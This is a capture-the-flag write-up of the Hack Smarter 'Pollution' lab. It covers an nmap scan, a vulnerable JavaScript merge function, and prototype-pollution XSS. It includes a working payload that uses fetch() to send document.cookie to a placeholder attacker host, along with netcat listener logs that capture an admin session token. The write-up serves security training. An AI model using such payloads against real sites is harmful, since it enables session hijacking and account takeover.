---
layout: single
title: 'Hack Smarter Pollution'
collection: writeups
author_profile: true
date: 2026-01-29
permalink: /writeups/pollution/
tags: [Hack Smarter, Easy, cookie hijacking, XSS]
---

## Overview

This write-up covers Pollution, an easy level, standalone web machine, from a somewhat new platform called Hack Smarter. Pollution is a simple machine that's great for practicing Prototype Pollution and session hijacking. You can access this mission for free on their platform with other machines being behind a monthly subscription. On this machine we start with user credentials for the web app.
**Username: pentester, Password: HackSmarter123**
[https://www.hacksmarter.org/courses/1de73367-b278-41ba-a63c-83c2d510621c](https://www.hacksmarter.org/courses/1de73367-b278-41ba-a63c-83c2d510621c)

<div style="margin: 2rem 0;"></div>

## Enumeration
<div style="margin: 1rem 0;"></div>
The attacker starts by using nmap to check available services.



```bash

 sudo nmap -sC -sV  -p- $IP --open          
 Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-30 18:34 EST
 Nmap scan report for 10.1.205.158
 Host is up (0.010s latency).
 Not shown: 65533 closed tcp ports (reset)
 PORT     STATE SERVICE VERSION
 22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey: 
 |   256 8f:8c:64:4e:06:de:5c:e3:79:ed:d3:89:aa:35:be:21 (ECDSA)
 |_  256 19:35:e3:a5:08:fb:ef:5d:07:be:e5:3f:60:13:46:9d (ED25519)
 3000/tcp open  http    Node.js Express framework
 |_http-title: Hacksmarter | Login
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 18.07 seconds

```
<div style="margin: 2rem 0;"></div>

Seeing port 3000 is open and hosting a web app, the attacker visits the site using provided credentials to login.
![login](/images/polu/polu_login.png) 
<div style="margin: 2rem 0;"></div>

Further enumerating the web app, the attacker notes an internal messenger that allows you to message the admin, a system search function and an incident response endpoint that returns 403 forbidden.
![mail](/images/polu/polu_mail.png) 
<div style="margin: 1rem 0;"></div>
![search](/images/polu/polu_search.png)
<div style="margin: 2rem 0;"></div>
The attacker then checks the source code for any easy vulnerabilities, paying attention to the script section the attacker notices a vulnerability in the syncState function. Due to a lack of input sanitization and property filtering, the function takes user-controlled data and merges it directly into JavaScript objects without validation. Because it doesn't guard against special keys like \_\_proto\_\_, constructor, or prototype, attackers can pollute the prototype chain and inject values that end up being rendered into the page. This is an exploit known as Prototype pollution. More info on prototype pollution how it works and how to defend against it [here](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/Prototype_pollution).
```js

 function syncState(params, target) {
     params.split('&').forEach(pair => {
         const index = pair.indexOf('=');
         if (index === -1) return;

         const key = pair.substring(0, index);
         const value = pair.substring(index + 1);
        
         const path = key.split('.');
         let current = target;

         for (let i = 0; i < path.length; i++) {
             const part = decodeURIComponent(path[i]);
             if (i === path.length - 1) {
                 current[part] = decodeURIComponent(value);
             } else {
                 current[part] = current[part] || {};
                 current = current[part];
             }
         }
     });
 }

```

<div style="margin: 2rem 0;"></div>
## Exploitation 
<div style="margin: 1rem 0;"></div>
At this point, the attacker begins testing for prototype pollution by pasting a simple XSS scipt in the browser taking advantage of the \_\_proto\_\_ property.

`http://IP:3000/dashboard#__proto__.renderCallback=%3Csvg/onload=alert(1)%3E/)`

![login](/images/polu/polu_xssconfirmed.png) 

<div style="margin: 2rem 0;"></div>

Now that the prototype pollution vulnerability is confirmed. The attacker checks the internal messenger, looking to see if the administrator views links with the goal of hijacking their session cookies. Using a simple NC listener, the attacker shares a link to their machine through the internal messaging system, then waits for an incoming connection.
`nc -lvnp 80`

<div style="margin: 1rem 0;"></div>


![csrf](/images/polu/polu_csrf.png)

<div style="margin: 2rem 0;"></div>

```bash

 nc -lvnp 80  
 listening on [any] 80 ...
 connect to [10.200.10.100] from (UNKNOWN) [10.1.205.158] 52254
 GET / HTTP/1.1
 Host: 10.200.10.100
 Connection: keep-alive
 Accept-Language: en-US,en;q=0.9
 Upgrade-Insecure-Requests: 1
 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/143.0.0.0 Safari/537.36
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7   
 Accept-Encoding: gzip, deflate
 
```

<div style="margin: 2rem 0;"></div>

Next, the attacker modifies the payload to take advantage of the prototype pollution vulnerability and steal the administrator session cookies.
`nc -lvnp 8000`
`IP:3000/dashboard#__proto__.renderCallback=<svg/onload=fetch('http://YOURIP:8000/?c='+document.cookie)>`

<div style="margin: 1rem 0;"></div>

![cookie](/images/polu/polu_cookiesteal.png)

<div style="margin: 1rem 0;"></div>

```bash

 nc -lvnp 8000
 listening on [any] 8000 ...
 connect to [10.200.10.100] from (UNKNOWN) [10.1.205.158] 53688
 GET /?c=session=HS_ADMIN_7721_SECURE_AUTH_TOKEN;%20user=admin HTTP/1.1
 Host: 10.200.32.132:8000
 Connection: keep-alive
 Accept-Language: en-US,en;q=0.9
 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/143.0.0.0 Safari/537.36

```
<div style="margin: 2rem 0;"></div>

Once the attacker has the Administrator's session cookies. It's as simple as changing the cookies in the browser developer tools (inspect) and retrieving the flag.
`http://IP:3000/incident-response` 
<div style="margin: 1rem 0;"></div>
 ![acookie](/images/polu/polu_admincookies.png)
